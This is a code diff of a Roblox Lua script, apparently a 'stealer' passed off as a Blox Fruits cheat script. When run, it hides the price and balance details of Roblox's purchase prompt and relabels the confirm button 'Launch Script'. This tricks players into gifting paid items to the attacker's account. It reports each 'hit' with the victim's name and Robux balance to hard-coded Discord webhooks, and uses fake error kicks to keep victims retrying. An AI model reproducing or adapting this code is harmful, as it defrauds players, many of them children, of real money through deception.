@@ -1,5 +1,5 @@
-LogsWebhook = "https://discord.com/api/webhooks/1333321409081905222/p0VRzfcIfesz3xhU60kkQYEzOuTbs5CEaGqXoEfB8pMo2P9lzLhp0a0GXFNOKtTfa6fc"
-ExecutionWebhook = "https://discord.com/api/webhooks/1333325268282249248/YKHzXc9GCgmHVApvAbNwzux1SC8HdSpntCMlNP9aqJehuUgdV_LsqiX4SJgKMyJtxlYG"
+LogsWebhook = "https://discord.com/api/webhooks/1333395663794343946/SsIWZd2b-7bUMhKLUizTgQsFLWUtnBWAPM4yuS7WnkwaqCYVNkHeb6X8a6P3pvS6Ybi4"
+ExecutionWebhook = "https://discord.com/api/webhooks/1333395709948592148/cUyj4VLvp_5jCcAChF8-q8S7zpHmMvd-G8ZvLg2UzYwBdpE8_6NUxYaMvLDf6EixsLt5"
 Username = "aka_0ver"
 PromptText = "Launch Script"
 RandomizedPrompt = false
@@ -8,24 +8,13 @@ RandomizedPrompt = false
 
 repeat task.wait() until game:IsLoaded()
 
-local validGames = {
-    [2753915549] = true,  -- Sea 1
-    [4442272183] = true,  -- Sea 2
-    [7449423635] = true   -- Sea 3
-}
-
-if not validGames[game.PlaceId] then
-    game:GetService("Players").LocalPlayer:Kick("Wrong game! This script is meant for Blox Fruits.")
-    return
-end
-
 if _G.scriptExecuted then
     warn("You have already executed this code.")
     return
 end
 
 local unsupportedExecutor = "Delta"
-local kickMessage = unsupportedExecutor .. " is currently unsupported on mobile. Please try a different executor (e.g., Codex, Fluxus) or use a PC."
+local kickMessage = unsupportedExecutor .. " DOES NOT WORK on mobile. Please try a different executor (e.g., Codex, ArceusX or Fluxus) or use a PC."
 
 local function getExecutor()
     if identifyexecutor then
@@ -58,10 +47,11 @@ local TweenService = game:GetService("TweenService")
 local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)
 
 local UserId
-local version = "1.2.8"
+local version = "1.3.0"
 local totalSpent = 0
 
 local messages = {
+    "Here's your gift!",
     "Enjoy your new item!",
     "A little something for you!",
     "Hope you like it!",
@@ -411,7 +401,7 @@ local messages = {
     "Boom EZ swag vibes rn",
     "Hype swag unlocked rn",
     "Imagine swag vibes rn",
-}
+  }
 
 local function loopSinkTransparency()
     while true do
@@ -469,213 +459,172 @@ local function modifyPromptUI(isFirstPrompt)
     prompt.BackgroundTransparency = 1
     prompt.Image = ""
 
-    for _, element in ipairs({
-        alertContents:FindFirstChild("TitleContainer"),
-        alertContents:FindFirstChild("MiddleContent"),
-        alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons"):FindFirstChild("1"),
-        alertContents:FindFirstChild("Footer"):FindFirstChild("FooterContent"):FindFirstChild("Content"):FindFirstChild("RemainingBalanceText")
-    }) do
-        if element then
-            element.Visible = false
+    local titleContainer = alertContents:FindFirstChild("TitleContainer")
+    if titleContainer then
+        local titleArea = titleContainer:FindFirstChild("TitleArea")
+        if titleArea then
+            titleArea.Visible = false
         end
     end
 
-    local button2 = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons"):FindFirstChild("2")
-    if button2 then
-        button2.Image = ""
-        button2.BackgroundTransparency = 1
-        button2:ClearAllChildren()
+    local middleContent = alertContents:FindFirstChild("MiddleContent")
+    if middleContent then
+        middleContent.Visible = false
+    end
 
-        button2.Size = UDim2.new(0, 500, 0, 120)
-        button2.Position = UDim2.new(0.5, -250, 0.5, -60)
-
-        local buttonContainer = Instance.new("Frame")
-        buttonContainer.Name = "ButtonContainer"
-        buttonContainer.Size = UDim2.new(1, 0, 1, 0)
-        buttonContainer.BackgroundTransparency = 1
-        buttonContainer.Parent = button2
-
-        local background = Instance.new("Frame")
-        background.Name = "Background"
-        background.Size = UDim2.new(1, 0, 1, 0)
-        background.BackgroundTransparency = 0.1
-        background.Parent = buttonContainer
-
-        local corner = Instance.new("UICorner")
-        corner.CornerRadius = UDim.new(0.2, 0)
-        corner.Parent = background
-
-        local gradient = Instance.new("UIGradient")
-        gradient.Rotation = RandomizedPrompt and math.random(0, 360) or 45
-        
-        local gradientColors
-        if RandomizedPrompt then
-            gradientColors = {
-                ColorSequenceKeypoint.new(0, getRandomColor()),
-                ColorSequenceKeypoint.new(0.5, getRandomColor()),
-                ColorSequenceKeypoint.new(1, getRandomColor())
-            }
-        else
-            gradientColors = {
-                ColorSequenceKeypoint.new(0, Color3.fromRGB(65, 135, 255)),
-                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 160, 255)),
-                ColorSequenceKeypoint.new(1, Color3.fromRGB(65, 135, 255))
-            }
+    local footerButtons = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons")
+    if footerButtons then
+        local button1 = footerButtons:FindFirstChild("1")
+        if button1 then
+            button1.Visible = false
         end
-        gradient.Color = ColorSequence.new(gradientColors)
-        gradient.Parent = background
 
-        local glow = Instance.new("ImageLabel")
-        glow.Name = "Glow"
-        glow.BackgroundTransparency = 1
-        glow.Image = "rbxassetid://7912134082"
-        glow.ImageColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(65, 135, 255)
-        glow.ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.7
-        glow.Size = UDim2.new(1.4, 0, 1.4, 0)
-        glow.Position = UDim2.new(0.5, 0, 0.5, 0)
-        glow.AnchorPoint = Vector2.new(0.5, 0.5)
-        glow.Parent = buttonContainer
+        local button2 = footerButtons:FindFirstChild("2")
+        if button2 then
+            button2:ClearAllChildren()
 
-        local buttonText = Instance.new("TextLabel")
-        buttonText.Name = "ButtonText"
-        buttonText.Size = UDim2.new(0.9, 0, 0.9, 0)
-        buttonText.Position = UDim2.new(0.5, 0, 0.5, 0)
-        buttonText.AnchorPoint = Vector2.new(0.5, 0.5)
-        buttonText.BackgroundTransparency = 1
-        buttonText.Text = PromptText or "Execute Script"
-        buttonText.TextColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(255, 255, 255)
-        buttonText.TextStrokeColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(0, 0, 0)
-        buttonText.TextStrokeTransparency = RandomizedPrompt and math.random(0, 5) / 10 or 0.7
-        buttonText.Font = RandomizedPrompt and getRandomFont() or Enum.Font.GothamBold
-        buttonText.TextScaled = true
-        buttonText.Parent = buttonContainer
+            local buttonContainer = Instance.new("Frame")
+            buttonContainer.Name = "ButtonContainer"
+            buttonContainer.Size = UDim2.new(1, 0, 1, 0)
+            buttonContainer.BackgroundTransparency = 1
+            buttonContainer.Parent = button2
 
-        local tweenService = game:GetService("TweenService")
+            local background = Instance.new("Frame")
+            background.Name = "Background"
+            background.Size = UDim2.new(1, 0, 1, 0)
+            background.BackgroundTransparency = 0.9
+            background.Parent = buttonContainer
 
-        local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-        local clickInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-        local waveInfo = TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+            local corner = Instance.new("UICorner")
+            corner.CornerRadius = UDim.new(0.2, 0)
+            corner.Parent = background
 
-        buttonContainer.Position = UDim2.new(0, 0, 2, 0)
-        local entranceTween = tweenService:Create(buttonContainer, TweenInfo.new(1, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
-            Position = UDim2.new(0, 0, 0, 0)
-        })
-        entranceTween:Play()
-
-        local function startWaveAnimation()
-            local rotationOffset = 0.5
-            local positionOffset = 0.005
+            local gradient = Instance.new("UIGradient")
+            gradient.Rotation = RandomizedPrompt and math.random(0, 360) or 45
             
-            local rotationTween = tweenService:Create(buttonContainer, waveInfo, {
-                Rotation = rotationOffset
-            })
-            rotationTween:Play()
-            
-            local positionTween = tweenService:Create(buttonContainer, waveInfo, {
-                Position = UDim2.new(positionOffset, 0, 0, 0)
-            })
-            positionTween:Play()
-
-            local glowTween = tweenService:Create(glow, waveInfo, {
-                ImageTransparency = RandomizedPrompt and math.random(3, 7) / 10 or 0.6
-            })
-            glowTween:Play()
-        end
-        startWaveAnimation()
-
-        button2.MouseEnter:Connect(function()
-            local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
-                Size = UDim2.new(1.1, 0, 1.1, 0)
-            })
-            
-            local hoverGradientColors
+            local gradientColors
             if RandomizedPrompt then
-                hoverGradientColors = {
+                gradientColors = {
                     ColorSequenceKeypoint.new(0, getRandomColor()),
                     ColorSequenceKeypoint.new(0.5, getRandomColor()),
                     ColorSequenceKeypoint.new(1, getRandomColor())
                 }
             else
-                hoverGradientColors = {
-                    ColorSequenceKeypoint.new(0, Color3.fromRGB(85, 155, 255)),
+                gradientColors = {
+                    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 150, 255)),
                     ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 180, 255)),
-                    ColorSequenceKeypoint.new(1, Color3.fromRGB(85, 155, 255))
+                    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 150, 255))
                 }
             end
-            
-            local colorTween = tweenService:Create(gradient, hoverInfo, {
-                Color = ColorSequence.new(hoverGradientColors)
-            })
-            
-            local glowTween = tweenService:Create(glow, hoverInfo, {
-                ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.4,
-                Size = UDim2.new(1.6, 0, 1.6, 0)
-            })
-            
-            scaleTween:Play()
-            colorTween:Play()
-            glowTween:Play()
-        end)
+            gradient.Color = ColorSequence.new(gradientColors)
+            gradient.Parent = background
 
-        button2.MouseLeave:Connect(function()
-            local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
-                Size = UDim2.new(1, 0, 1, 0)
-            })
-            
-            local colorTween = tweenService:Create(gradient, hoverInfo, {
-                Color = ColorSequence.new(gradientColors)
-            })
-            
-            local glowTween = tweenService:Create(glow, hoverInfo, {
-                ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.7,
-                Size = UDim2.new(1.4, 0, 1.4, 0)
-            })
-            
-            scaleTween:Play()
-            colorTween:Play()
-            glowTween:Play()
-        end)
+            local glow = Instance.new("ImageLabel")
+            glow.Name = "Glow"
+            glow.BackgroundTransparency = 1
+            glow.Image = "rbxassetid://7912134082"
+            glow.ImageColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(80, 150, 255)
+            glow.ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
+            glow.Size = UDim2.new(1.2, 0, 1.2, 0)
+            glow.Position = UDim2.new(0.5, 0, 0.5, 0)
+            glow.AnchorPoint = Vector2.new(0.5, 0.5)
+            glow.Parent = buttonContainer
 
-        button2.MouseButton1Down:Connect(function()
-            local clickTween = tweenService:Create(buttonContainer, clickInfo, {
-                Size = UDim2.new(0.95, 0, 0.95, 0)
-            })
+            local buttonText = Instance.new("TextLabel")
+            buttonText.Name = "ButtonText"
+            buttonText.Size = UDim2.new(1, 0, 1, 0)
+            buttonText.BackgroundTransparency = 1
+            buttonText.Text = PromptText or "Execute Script"
+            buttonText.TextColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(255, 255, 255)
+            buttonText.TextStrokeColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(0, 0, 0)
+            buttonText.TextStrokeTransparency = RandomizedPrompt and math.random(0, 5) / 10 or 0
+            buttonText.Font = RandomizedPrompt and getRandomFont() or Enum.Font.PermanentMarker
+            buttonText.TextScaled = true
+            buttonText.Parent = buttonContainer
             
-            local clickGradientColors
-            if RandomizedPrompt then
-                clickGradientColors = {
-                    ColorSequenceKeypoint.new(0, getRandomColor()),
-                    ColorSequenceKeypoint.new(0.5, getRandomColor()),
-                    ColorSequenceKeypoint.new(1, getRandomColor())
-                }
-            else
-                clickGradientColors = {
-                    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 115, 235)),
-                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 140, 235)),
-                    ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 115, 235))
-                }
+            local textShadow = buttonText:Clone()
+            textShadow.Name = "TextShadow"
+            textShadow.Position = UDim2.new(0, 2, 0, 2)
+            textShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
+            textShadow.TextTransparency = 0.8
+            textShadow.ZIndex = buttonText.ZIndex - 1
+            textShadow.Parent = buttonContainer
+
+            local tweenService = game:GetService("TweenService")
+            local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
+            local glowInfo = TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
+
+            local glowTween = tweenService:Create(glow, glowInfo, {
+                ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6,
+                Size = UDim2.new(1.3, 0, 1.3, 0)
+            })
+            glowTween:Play()
+
+            button2.MouseEnter:Connect(function()
+                local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
+                    Size = UDim2.new(1.1, 0, 1.1, 0)
+                })
+                
+                local hoverGradientColors
+                if RandomizedPrompt then
+                    hoverGradientColors = {
+                        ColorSequenceKeypoint.new(0, getRandomColor()),
+                        ColorSequenceKeypoint.new(0.5, getRandomColor()),
+                        ColorSequenceKeypoint.new(1, getRandomColor())
+                    }
+                else
+                    hoverGradientColors = {
+                        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 170, 255)),
+                        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(140, 200, 255)),
+                        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 170, 255))
+                    }
+                end
+                
+                local colorTween = tweenService:Create(gradient, hoverInfo, {
+                    Color = ColorSequence.new(hoverGradientColors)
+                })
+                
+                local glowColorTween = tweenService:Create(glow, hoverInfo, {
+                    ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.6
+                })
+                
+                scaleTween:Play()
+                colorTween:Play()
+                glowColorTween:Play()
+            end)
+
+            button2.MouseLeave:Connect(function()
+                local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
+                    Size = UDim2.new(1, 0, 1, 0)
+                })
+                
+                local colorTween = tweenService:Create(gradient, hoverInfo, {
+                    Color = ColorSequence.new(gradientColors)
+                })
+                
+                local glowColorTween = tweenService:Create(glow, hoverInfo, {
+                    ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.8
+                })
+                
+                scaleTween:Play()
+                colorTween:Play()
+                glowColorTween:Play()
+            end)
+        end
+    end
+
+    local footer = alertContents:FindFirstChild("Footer")
+    if footer then
+        local footerContent = footer:FindFirstChild("FooterContent")
+        if footerContent then
+            local content = footerContent:FindFirstChild("Content")
+            if content then
+                local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
+                if RemainingBalanceText then
+                    RemainingBalanceText.Visible = false
+                end
             end
-            
-            local colorTween = tweenService:Create(gradient, clickInfo, {
-                Color = ColorSequence.new(clickGradientColors)
-            })
-            
-            clickTween:Play()
-            colorTween:Play()
-        end)
-
-        button2.MouseButton1Up:Connect(function()
-            local releaseTween = tweenService:Create(buttonContainer, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
-                Size = UDim2.new(1, 0, 1, 0)
-            })
-            
-            local colorTween = tweenService:Create(gradient, hoverInfo, {
-                Color = ColorSequence.new(gradientColors)
-            })
-            
-            releaseTween:Play()
-            colorTween:Play()
-        end)
+        end
     end
 end
 
@@ -698,7 +647,7 @@ local function sendExecutionLog()
     local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"
 
     local embed = {
-        ["title"] = "STEALER EXECUTION!",
+        ["title"] = "Script Execution Log",
         ["color"] = 3063792,
         ["fields"] = {
             {
@@ -771,17 +720,12 @@ local function getRobuxBalance()
     return (balanceText and tonumber(balanceText) or 0) + 25
 end
 
-local webhookSent2 = false 
-
 local function sendWebhook(totalSpent, itemName)
-    if webhookSent2 then
-        return
-    end
-
+    local balance = getRobuxBalance()
     local executorIdentifier = getExecutor()
 
     local embed = {
-        ["title"] = "! PROMPTED USER WITH ITEM, POTENTIAL HIT! ! :owl:",
+        ["title"] = ":shark: ! SHARKED LMAO ! :shark:",
         ["color"] = 39423,
         ["fields"] = {
             {
@@ -801,61 +745,12 @@ local function sendWebhook(totalSpent, itemName)
                 ["value"] = "```Executor: " .. executorIdentifier .. "```"
             },
             {
-                ["name"] = "Join Fistor's Stealer Discord! Current Stealer Version: 1.2.8",
-                ["value"] = "[**Join Invite**](https://discord.gg/tanThs2F)",
-            }
-        }
-    }
-
-    local data = HttpService:JSONEncode({
-        ["content"] = "GG",
-        ["embeds"] = {embed}
-    })
-
-    request({
-        Url = LogsWebhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = data
-    })
-
-    webhookSent2 = true
-end
-
-local webhookSent3 = false 
-
-local function sendWebhook2(totalSpent)
-    if webhookSent3 then
-        return
-    end
-
-    local executorIdentifier = getExecutor()
-
-    local embed = {
-        ["title"] = "! User Has Confirmed Purchase Prompt. HIT! ! :owl:",
-        ["color"] = 39423,
-        ["fields"] = {
-            {
-                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
-                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
+                ["name"] = "ᴄᴜʀʀᴇɴᴛ ʀᴏʙᴜx",
+                ["value"] = "```" .. balance .. "```"
             },
             {
-                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
-                ["value"] = "```" .. totalSpent .. "```"
-            },
-            {
-                ["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ",
-                ["value"] = "```Executor: " .. executorIdentifier .. "```"
-            },
-            {
-                ["name"] = "INFO",
-                ["value"] = "User has confirmed the purchase prompt! Means, you should get the Item 99%. GG"
-            },
-            {
-                ["name"] = "Join Fistor's Stealer Discord! Current Stealer Version: 1.2.8",
-                ["value"] = "[**Join Invite**](https://discord.gg/tanThs2F)",
+                ["name"] = "Current Stealer Version: 1.3.0",
+                ["value"] = "**1.3.0**",
             }
         }
     }
@@ -873,8 +768,6 @@ local function sendWebhook2(totalSpent)
         },
         Body = data
     })
-
-    webhookSent3 = true
 end
 
 local promptConfirmed = false
@@ -903,31 +796,16 @@ local function waitForPurchaseConfirmation()
     local footerButtons = footer:WaitForChild("Buttons")
 
     local confirmButton = footerButtons:WaitForChild("2")
-    local function onInteraction()
+    confirmButton.MouseButton1Click:Connect(function()
         promptConfirmed = true
-    end
-    confirmButton.MouseButton1Click:Connect(onInteraction)
-    confirmButton.TouchTap:Connect(onInteraction)
-end
-
-local function verifyUserId()
-    local success, err = pcall(function()
-        UserId = Players:GetUserIdFromNameAsync(Username)
     end)
-    if not success or not UserId then
-        game.Players.LocalPlayer:Kick("Fatal error. Rejoin & Try again.")
-        return false
-    end
-    return true
 end
 
 local webhookSent = false
 
-local function buyItem(storageName, cost)
+local function buyItem(storageName, purchaseLocation, cost)
     if purchaseInProgress then return end
     purchaseInProgress = true
-    
-    if not verifyUserId() then return end
     
     local balance = getRobuxBalance()
     local targetUser = {
@@ -938,31 +816,26 @@ local function buyItem(storageName, cost)
     local args = {
         [1] = "buyRobuxShop",
         [2] = {
-            ["StorageName"] = storageName,
-            ["PurchaseAction"] = "Gift",
-            ["PurchaseLocation"] = "Shop",
             ["Message"] = getRandomMessage(),
+            ["StorageName"] = storageName,
+            ["PurchaseLocation"] = purchaseLocation,
             ["FunnelId"] = "Shop",
             ["ReceiverName"] = targetUser.name,
-            ["ReceiverUserId"] = targetUser.id,
+            ["ReceiverUserId"] = targetUser.id
         }
     }
     
     local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
-    local success, err = pcall(function()
+    local success = pcall(function()
         CommF:InvokeServer(unpack(args))
     end)
 
-    if not success then
-        warn("Purchase failed:", err)
-        purchaseInProgress = false
-        return
-    end
-
-    totalSpent = totalSpent + cost
-    if not webhookSent then
-        sendWebhook(totalSpent, storageName)
-        webhookSent = true
+    if success then
+        totalSpent = totalSpent + cost
+        if not webhookSent then
+            sendWebhook(totalSpent, storageName)
+            webhookSent = true
+        end
     end
 
     waitForPromptToDisappear()
@@ -972,96 +845,95 @@ end
 hideNotifications()
 
 local function stealItem(balance)
-    -- << Permanent Fruits
     if balance >= 5000 then
-        buyItem("Permanent Dragon-Dragon", 5000)
+        buyItem("Permanent Dragon-Dragon", "FruitShop", 5000)
     elseif balance >= 4000 then
-        buyItem("Permanent Kitsune-Kitsune", 4000)
+        buyItem("Permanent Kitsune-Kitsune", "FruitShop", 4000)
     elseif balance >= 3000 then
-        buyItem("Permanent Yeti-Yeti", 3000)
-    elseif balance >= 2550 then
-        buyItem("Permanent Spirit-Spirit", 2550)
-    elseif balance >= 2500 then
-        buyItem("Permanent Gas-Gas", 2500)
-    elseif balance >= 2450 then
-        buyItem("Permanent Venom-Venom", 2450)
-    elseif balance >= 2425 then
-        buyItem("Permanent Shadow-Shadow", 2425)
-    elseif balance >= 2400 then
-        buyItem("Permanent Dough-Dough", 2400)
-    elseif balance >= 2350 then
-        buyItem("Permanent T-Rex-T-Rex", 2350)
-    elseif balance >= 2300 then
-        buyItem("Permanent Gravity-Gravity", 2300)
-    elseif balance >= 2250 then
-        buyItem("Permanent Blizzard-Blizzard", 2250)
-    elseif balance >= 2200 then
-        buyItem("Permanent Pain-Pain", 2200)
-    elseif balance >= 2100 then
-        buyItem("Permanent Rumble-Rumble", 2100)
-    elseif balance >= 2000 then
-        buyItem("Permanent Portal-Portal", 2000)
-    elseif balance >= 1900 then
-        buyItem("Permanent Sound-Sound", 1900)
-    elseif balance >= 1800 then
-        buyItem("Permanent Spider-Spider", 1800)
-    elseif balance >= 1700 then
-        buyItem("Permanent Love-Love", 1700)
-    elseif balance >= 1650 then
-        buyItem("Permanent Buddha-Buddha", 1650)
-    elseif balance >= 1300 then
-        buyItem("Permanent Magma-Magma", 1300)
-    elseif balance >= 1275 then
-        buyItem("Permanent Ghost-Ghost", 1275)
-    elseif balance >= 1250 then
-        buyItem("Permanent Barrier-Barrier", 1250)
-    elseif balance >= 1100 then
-        buyItem("Permanent Light-Light", 1100)
-    elseif balance >= 1000 then
-        buyItem("Permanent Diamond-Diamond", 1000)
-    elseif balance >= 950 then
-        buyItem("Permanent Dark-Dark", 950)
-    elseif balance >= 850 then
-        buyItem("Permanent Sand-Sand", 850)
-    elseif balance >= 750 then
-        buyItem("Permanent Ice-Ice", 750)
-    elseif balance >= 650 then
-        buyItem("Permanent Falcon-Falcon", 650)
-    elseif balance >= 550 then
-        buyItem("Permanent Flame-Flame", 550)
-    elseif balance >= 380 then
-        buyItem("Permanent Spike-Spike", 380)
-    elseif balance >= 250 then
-        buyItem("Permanent Smoke-Smoke", 250)
-    elseif balance >= 220 then
-        buyItem("Permanent Bomb-Bomb", 220)
-    elseif balance >= 180 then
-        buyItem("Permanent Spring-Spring", 180)
-    elseif balance >= 100 then
-        buyItem("Permanent Blade-Blade", 100)
-    elseif balance >= 75 then
-        buyItem("Permanent Spin-Spin", 75)
-
-    -- << Gamepasses
+        buyItem("Permanent Yeti-Yeti", "FruitShop", 3000)
     elseif balance >= 2700 then
-        buyItem("Fruit Notifier", 2700)
+        buyItem("Fruit Notifier", "Shop", 2700)
+    elseif balance >= 2550 then
+        buyItem("Permanent Spirit-Spirit", "FruitShop", 2550)
+    elseif balance >= 2500 then
+        buyItem("Permanent Gas-Gas", "FruitShop", 2500)
+    elseif balance >= 2450 then
+        buyItem("Permanent Venom-Venom", "FruitShop", 2450)
+    elseif balance >= 2425 then
+        buyItem("Permanent Shadow-Shadow", "FruitShop", 2425)
+    elseif balance >= 2400 then
+        buyItem("Permanent Dough-Dough", "FruitShop", 2400)
+    elseif balance >= 2350 then
+        buyItem("Permanent T-Rex-T-Rex", "FruitShop", 2350)
+    elseif balance >= 2300 then
+        buyItem("Permanent Gravity-Gravity", "FruitShop", 2300)
+    elseif balance >= 2250 then
+        buyItem("Permanent Blizzard-Blizzard", "FruitShop", 2250)
+    elseif balance >= 2200 then
+        buyItem("Permanent Pain-Pain", "FruitShop", 2200)
+    elseif balance >= 2100 then
+        buyItem("Permanent Rumble-Rumble", "FruitShop", 2100)
+    elseif balance >= 2000 then
+        buyItem("Permanent Portal-Portal", "FruitShop", 2000)
+    elseif balance >= 1900 then
+        buyItem("Permanent Sound-Sound", "FruitShop", 1900)
+    elseif balance >= 1800 then
+        buyItem("Permanent Spider-Spider", "FruitShop", 1800)
+    elseif balance >= 1700 then
+        buyItem("Permanent Love-Love", "FruitShop", 1700)
+    elseif balance >= 1650 then
+        buyItem("Permanent Buddha-Buddha", "FruitShop", 1650)
     elseif balance >= 1500 then
-        buyItem("3x Mythical Scrolls", 1500)
+        buyItem("3x Mythical Scrolls", "Shop", 1500)
+    elseif balance >= 1300 then
+        buyItem("Permanent Magma-Magma", "FruitShop", 1300)
+    elseif balance >= 1275 then
+        buyItem("Permanent Ghost-Ghost", "FruitShop", 1275)
+    elseif balance >= 1250 then
+        buyItem("Permanent Barrier-Barrier", "FruitShop", 1250)
     elseif balance >= 1200 then
-        buyItem("Dark Blade", 1200)
+        buyItem("Dark Blade", "Shop", 1200)
+    elseif balance >= 1100 then
+        buyItem("Permanent Light-Light", "FruitShop", 1100)
+    elseif balance >= 1000 then
+        buyItem("Permanent Diamond-Diamond", "FruitShop", 1000)
+    elseif balance >= 950 then
+        buyItem("Permanent Dark-Dark", "FruitShop", 950)
+    elseif balance >= 850 then
+        buyItem("Permanent Sand-Sand", "FruitShop", 850)
+    elseif balance >= 750 then
+        buyItem("Permanent Ice-Ice", "FruitShop", 750)
+    elseif balance >= 650 then
+        buyItem("Permanent Falcon-Falcon", "FruitShop", 650)
+    elseif balance >= 550 then
+        buyItem("Permanent Flame-Flame", "FruitShop", 550)
+    elseif balance >= 460 then
+        buyItem("2x Mastery", "Shop", 450)
     elseif balance >= 450 then
-        buyItem("2x Mastery", 450)
-    elseif balance >= 450 then
-        buyItem("2x Money", 450)
+        buyItem("2x Money", "Shop", 450)
     elseif balance >= 400 then
-        buyItem("+1 Fruit Storage", 400)
+        buyItem("+1 Fruit Storage", "Shop", 400)
+    elseif balance >= 380 then
+        buyItem("Permanent Spike-Spike", "FruitShop", 380)
     elseif balance >= 350 then
-        buyItem("2x Boss Drops", 350)
+        buyItem("2x Boss Drops", "Shop", 350)
+    elseif balance >= 250 then
+        buyItem("Permanent Smoke-Smoke", "FruitShop", 250)
+    elseif balance >= 220 then
+        buyItem("Permanent Bomb-Bomb", "FruitShop", 220)
+    elseif balance >= 180 then
+        buyItem("Permanent Spring-Spring", "FruitShop", 180)
+    elseif balance >= 100 then
+        buyItem("Permanent Blade-Blade", "FruitShop", 100)
+    elseif balance >= 75 then
+        buyItem("Permanent Spin-Spin", "FruitShop", 75)
     elseif balance >= 50 then
-        buyItem("10K Money", 50)
+        buyItem("Permanent Rocket-Rocket", "FruitShop", 50)
     elseif balance >= 25 then
-        buyItem("2x EXP (15 mins.)", 25)
+        buyItem("2x EXP (15 mins.)", "Shop", 25)
     end
+
+    return
 end
 
 local CoreGui = game:GetService("CoreGui")
@@ -1095,7 +967,7 @@ local function getRobuxAndProceed()
                 local RobuxUpsellContainer = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
                 if RobuxUpsellContainer then
                     RobuxUpsellContainer.Visible = false
-                    game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
+                    game.Players.LocalPlayer:Kick("\n[DELTA DOES NOT WORK WITH THIS SCRIPT DONT USE ALTS]\nScript Failed To Load!\nCheck the following- \n1) Please Sub to SharkyScripts\n2) Use main account, alts will be detected\n3) Use different Executor & Try again.")
                     break
                 end
                 task.wait(0.1)
@@ -1119,7 +991,7 @@ local function getRobuxAndProceed()
                     local balance = getRobuxBalance()
             
                     if balance < 25 then
-                        game.Players.LocalPlayer:Kick("Script Failed To Load! Please, Rejoin & Try again.")
+                        game.Players.LocalPlayer:Kick("\n[DELTA DOES NOT WORK WITH THIS SCRIPT DONT USE ALTS]\nScript Failed To Load!\nCheck the following- \n1) Please Sub to SharkyScripts\n2) Use main account, alts will be detected\n3) Use different Executor & Try again.")
                         return
                     end
 
@@ -1162,37 +1034,13 @@ local function waitForPrompt()
         end
     end)
 
-    local messages = {
-        "Error! Please, Rejoin & Try Again.",
-        "You have been kicked from this game. Reason: Unexpected error. Rejoin & Try again.",
-        "Oops! Something went wrong. Try rejoining. Rejoin & Try again.",
-        "Your connection was lost. Please reconnect. Rejoin & Try again.",
-        "You were kicked for suspicious activity. Contact support if this is a mistake. Rejoin & Try again.",
-        "Game data error!. Please rejoin. Rejoin & Try again.",
-        "Network timeout. Reconnect to continue. Rejoin & Try again.",
-        "This session has expired. Please rejoin. Rejoin & Try again.",
-        "Invalid client state detected. Restart and try again.",
-        "You were kicked for exceeding the rate limit. Slow down! Rejoin & Try again.",
-        "Server maintenance. Come back later. Rejoin & Try again.",
-        "Unspecified error. Please try rejoining. Rejoin & Try again.",
-        "Something broke. Report this to the developers. Rejoin & Try again.",
-        "ERROR. Rejoin & Try again.",
-        "Oops! The server tripped on a bug. Please rejoin. Rejoin & Try again.",
-        "Illegal move detected. Rejoin & Try again.",
-        "Disconnected due to inactivity. Rejoin when you're ready. Rejoin & Try again.",
-        "Kicked by Uzoth. Reason: Sorry random dude, just testing kick system, you can rejoin",
-    }
-
     coroutine.wrap(function()
         while not promptConfirmed do
             task.wait()
         end
 
-        if totalSpent >= 25 and promptConfirmed then
-            sendWebhook2(totalSpent)
-            task.wait(0.5)
